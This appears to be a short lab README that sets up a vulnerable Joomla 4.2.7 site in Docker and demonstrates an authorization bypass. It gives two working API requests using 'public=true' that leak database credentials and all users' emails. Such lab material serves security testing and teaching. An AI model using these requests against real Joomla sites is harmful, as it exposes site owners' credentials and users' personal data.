## Vulnerable Environment

Execute following command to start a Joomla site 4.2.7:

```
docker-compose up -d
```

You can access the Joomla website through `http://your-ip:8080` after the server is started.

## Exploit

This issue is caused by an attribute overwrite issue, the attacker can use `public=true` to bypass the authorization check.

For example, expose all configuration including MySQL username and password through this link:

```
http://your-ip:8080/api/index.php/v1/config/application?public=true
```

Otherwise access is unauthorized without `public=true`：

Expose all users information including emails through this link:

```
http://your-ip:8080/api/index.php/v1/users?public=true
```
